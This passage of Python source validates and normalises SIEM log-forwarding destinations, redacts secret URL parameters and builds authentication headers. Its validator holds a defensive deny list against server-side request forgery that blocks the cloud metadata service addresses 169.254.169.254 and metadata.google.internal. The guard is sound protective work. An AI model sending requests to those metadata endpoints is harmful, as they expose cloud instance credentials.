    iso_match = re.search(r"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:\+00:00|Z)?)", raw)
    if iso_match:
        return iso_match.group(1)
    apache_match = re.search(r"\[(\d{2}/[A-Za-z]{3}/\d{4}:\d{2}:\d{2}:\d{2} [+-]\d{4})\]", raw)
    if apache_match:
        try:
            return datetime.strptime(apache_match.group(1), "%d/%b/%Y:%H:%M:%S %z").isoformat()
        except ValueError:
            return ""
    return ""


def _validate_siem_destination(destination_url: str, connection_mode: str = "auto") -> str:
    destination = destination_url.strip()
    if not destination:
        raise ValueError("SIEM destination URL is required")
    if connection_mode not in {"auto", "direct", "docker_host"}:
        raise ValueError("Unsupported SIEM connection mode")
    if not re.match(r"^[A-Za-z][A-Za-z0-9+.-]*://", destination):
        destination = f"http://{destination}"
    parsed = parse.urlparse(destination)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("SIEM destination must use http or https")
    if not parsed.hostname:
        raise ValueError("SIEM destination host is required")
    if parsed.username or parsed.password:
        raise ValueError("Credentials in SIEM URL are not allowed; use the SIEM authentication fields instead")

    hostname = parsed.hostname.lower()
    use_docker_host = connection_mode == "docker_host" or (connection_mode == "auto" and _running_in_container())
    if hostname in {"0.0.0.0", "::"}:
        replacement_host = "host.docker.internal" if use_docker_host else "127.0.0.1"
        netloc = replacement_host
        if parsed.port:
            netloc = f"{netloc}:{parsed.port}"
        parsed = parsed._replace(netloc=netloc)
        hostname = replacement_host
    elif hostname in {"localhost", "127.0.0.1"} and use_docker_host:
        netloc = "host.docker.internal"
        if parsed.port:
            netloc = f"{netloc}:{parsed.port}"
        parsed = parsed._replace(netloc=netloc)
        hostname = "host.docker.internal"
    if hostname in {"169.254.169.254", "metadata.google.internal"}:
        raise ValueError("Metadata service destinations are blocked")

    try:
        infos = socket.getaddrinfo(hostname, parsed.port or (443 if parsed.scheme == "https" else 80), type=socket.SOCK_STREAM)
    except socket.gaierror as exc:
        raise ValueError(f"Cannot resolve SIEM destination host: {hostname}") from exc
    for info in infos:
        address = info[4][0]
        try:
            ip = ipaddress.ip_address(address)
        except ValueError:
            continue
        if ip.is_link_local or ip.is_multicast or ip.is_unspecified:
            raise ValueError("Unsafe SIEM destination address is blocked")
        if str(ip) == "169.254.169.254":
            raise ValueError("Metadata service destinations are blocked")

    return parse.urlunparse(parsed)


def normalize_siem_destination_for_storage(destination_url: str) -> str:
    destination = destination_url.strip()
    if not destination:
        raise ValueError("SIEM destination URL is required")
    if not re.match(r"^[A-Za-z][A-Za-z0-9+.-]*://", destination):
        destination = f"http://{destination}"
    parsed = parse.urlparse(destination)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("SIEM destination must use http or https")
    if not parsed.hostname:
        raise ValueError("SIEM destination host is required")
    if parsed.username or parsed.password:
        raise ValueError("Credentials in SIEM URL are not allowed; use the SIEM authentication fields instead")
    return parse.urlunparse(parsed)


def _redact_siem_destination(destination: str) -> str:
    parsed = parse.urlparse(destination)
    if not parsed.query:
        return destination
    sensitive = {"api_key", "apikey", "key", "secret", "password", "pass", "auth", "access_token", "bearer"}
    pairs = parse.parse_qsl(parsed.query, keep_blank_values=True)
    redacted_pairs = [(key, "REDACTED" if key.lower() in sensitive else value) for key, value in pairs]
    return parse.urlunparse(parsed._replace(query=parse.urlencode(redacted_pairs)))


def _running_in_container() -> bool:
    if Path("/.dockerenv").exists():
        return True
    cgroup = Path("/proc/1/cgroup")
    if not cgroup.exists():
        return False
    try:
        content = cgroup.read_text(encoding="utf-8", errors="ignore")
    except OSError:
        return False
    return "docker" in content or "kubepods" in content or "containerd" in content


def _siem_connection_error(error: str, original_destination: str, connection_destination: str, connection_mode: str) -> str:
    original_host = parse.urlparse(original_destination.strip() if "://" in original_destination else f"http://{original_destination.strip()}").hostname
    connection_host = parse.urlparse(connection_destination).hostname
    if "wrong version number" in error or "record layer failure" in error or "unknown protocol" in error:
        return (
            f"{error}. TLS handshake failed. The collector is probably HTTP, not HTTPS. "
            "Change the destination scheme to http:// or enable TLS on the collector."
        )
    if (
        connection_mode == "direct"
        and original_host in {"localhost", "127.0.0.1"}
        and _running_in_container()
        and "Connection refused" in error
    ):
        return (
            f"{error}. Direct mode preserves localhost/127.0.0.1 inside the API container. "
            "For a collector running on the Docker host, choose Docker host gateway or Auto connection route."
        )
    if original_host in {"localhost", "127.0.0.1"} and connection_host == "host.docker.internal":
        return (
            f"{error}. Docker translated localhost/127.0.0.1 to host.docker.internal. "
            "If the SIEM collector runs on the host, make sure it is listening on the host network interface "
            "or 0.0.0.0, not only on loopback, and use the correct http/https scheme."
        )
    return error


def _siem_auth_headers(
    auth_type: str,
    username: str = "",
    password: str = "",
    token: str = "",
    header_name: str = "",
) -> dict[str, str]:
    if auth_type == "none":
        return {}
    if auth_type == "bearer":
        if not token:
            raise ValueError("Bearer authentication requires a token")
        return {"Authorization": f"Bearer {token}"}
    if auth_type == "token":
        if not token:
            raise ValueError("Token authentication requires a token")
        return {"Authorization": f"Token {token}"}
    if auth_type == "basic":
        if not username or not password:
            raise ValueError("Basic authentication requires username and password")
        encoded = base64.b64encode(f"{username}:{password}".encode("utf-8")).decode("ascii")
        return {"Authorization": f"Basic {encoded}"}
    if auth_type == "custom_header":
        if not header_name or not token:
            raise ValueError("Custom header authentication requires header name and token")
        if not re.match(r"^[A-Za-z0-9-]{1,80}$", header_name):
            raise ValueError("Custom auth header name contains invalid characters")
        if header_name.lower() in {"host", "content-length", "content-type", "user-agent"}:
            raise ValueError("This custom auth header name is reserved")
        return {header_name: token}
    raise ValueError("Unsupported SIEM authentication type")
